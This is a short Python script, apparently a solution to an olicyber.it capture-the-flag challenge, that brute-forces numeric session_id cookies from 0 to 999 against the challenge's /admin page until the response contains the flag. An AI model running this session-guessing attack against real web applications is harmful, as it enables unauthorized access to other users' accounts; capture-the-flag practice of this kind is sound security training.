from bs4 import *
import requests

for i in range(1000):
    
    cookies = {"session_id" : str(i)}
    page = requests.get("http://too-small-reminder.challs.olicyber.it/admin", cookies=cookies)
    soup = BeautifulSoup(page.text, "html.parser")

    if "flag" in soup.text:
        print(soup.text)
        break
